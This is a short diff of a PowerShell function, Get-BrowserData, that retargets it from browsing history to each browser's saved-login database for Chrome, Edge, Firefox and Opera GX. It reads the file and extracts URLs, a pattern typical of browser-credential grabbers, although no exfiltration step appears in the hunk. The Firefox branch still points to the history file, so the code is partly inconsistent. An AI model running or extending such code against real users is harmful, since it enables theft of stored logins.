@@ -10,10 +10,10 @@ function Get-BrowserData {
 
     $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
 
-    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"}
-    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/Login Data"}
-    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
-    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Login Data"}
+    if     ($Browser -eq 'chrome'  -and $DataType -eq 'login'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"}
+    elseif ($Browser -eq 'edge'    -and $DataType -eq 'login'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/Login Data"}
+    elseif ($Browser -eq 'firefox' -and $DataType -eq 'login'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
+    elseif ($Browser -eq 'opera'   -and $DataType -eq 'login'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Login Data"}
 
     $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
     $Value | ForEach-Object {
